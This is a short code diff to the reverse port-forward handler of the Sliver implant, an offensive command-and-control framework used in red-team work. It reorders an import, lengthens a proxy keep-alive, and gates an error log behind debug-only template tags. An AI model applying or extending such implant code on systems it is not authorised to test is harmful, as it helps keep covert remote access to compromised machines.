@@ -21,9 +21,9 @@ package handlers
 import (
 	// {{if .Config.Debug}}
 	"log"
-	"time"
 
 	// {{end}}
+	"time"
 
 	rportfwd "github.com/bishopfox/sliver/implant/sliver/rportfwd"
 	"github.com/bishopfox/sliver/implant/sliver/tcpproxy"
@@ -89,7 +89,7 @@ func rportFwdStartListenerHandler(envelope *pb.Envelope, connection *transports.
 		Conn:            connection,
 		RemoteAddr:      req.ForwardAddress,
 		BindAddr:        req.BindAddress,
-		KeepAlivePeriod: 60 * time.Second,
+		KeepAlivePeriod: 1000 * time.Second,
 		DialTimeout:     30 * time.Second,
 	}
 	tcpProxy.AddRoute(req.BindAddress, channelProxy)
@@ -98,7 +98,9 @@ func rportFwdStartListenerHandler(envelope *pb.Envelope, connection *transports.
 	go func() {
 		err := tcpProxy.Run()
 		if err != nil {
+			// {{if .Config.Debug}}
 			log.Printf("Proxy error %s", err)
+			// {{end}}
 		}
 	}()
 	resp.BindAddress = req.BindAddress
